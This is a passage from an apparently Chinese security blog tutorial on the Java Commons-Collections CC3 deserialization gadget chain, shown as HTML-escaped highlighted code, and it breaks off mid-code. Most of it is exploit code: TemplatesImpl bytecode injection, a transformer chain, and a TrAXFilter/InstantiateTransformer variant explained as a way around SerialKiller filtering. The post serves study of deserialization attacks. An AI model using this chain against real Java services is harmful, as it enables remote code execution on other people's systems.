&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">code&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDecoder&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">decode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>&lt;span style="color:#111">code&lt;/span>&lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_tfactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;newTransformer&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">null&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">TransformedMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;amiz&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>但是并不是标准的payload，ysoserial中并没有用到InvokerTransformer，原因是&lt;code>SerialKiller&lt;/code>的存在限制了它，我们换为&lt;code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&lt;/code>&lt;/p>
&lt;p>这个类的构造方法中调用了了&lt;code>(TransformerImpl) templates.newTransformer()&lt;/code>，免去了我们的手工调用&lt;/p>
&lt;p>缺少InvokerTransformer无法调用TraAXFilter的构造方法，这里用&lt;code>org.apache.commons.collections.functors.InstantiateTransformer&lt;/code>这个Transformer&lt;/p>
&lt;p>所以我们利用&lt;code>InstantiateTransformer&lt;/code>调用到&lt;code>TrAXFilter&lt;/code>的构造方法，再利用它构造方法中的&lt;code>templates.newTransformer&lt;/code>调用到&lt;code>TemplatesImpl&lt;/code>里的字节码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">TrAXFilter&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InstantiateTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Templates&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>完整CC3&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ysoserial.payloads&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.ClassPool&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InstantiateTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.TransformedMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.xml.transform.Templates&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.annotation.Retention&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Constructor&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.InvocationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Base64&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC3&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// setFieldValue(obj, &amp;#34;_bytecodes&amp;#34;, new byte[][]{Base64.getDecoder().decode(&amp;#34;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&amp;#34;)});
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ClassPool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDefault&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">evil&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">EvilTemplatesImpl&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()).&lt;/span>&lt;span style="color:#75af00">toBytecode&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_tfactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">fakeTransformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">TrAXFilter&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InstantiateTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">Templates&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fakeTransformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
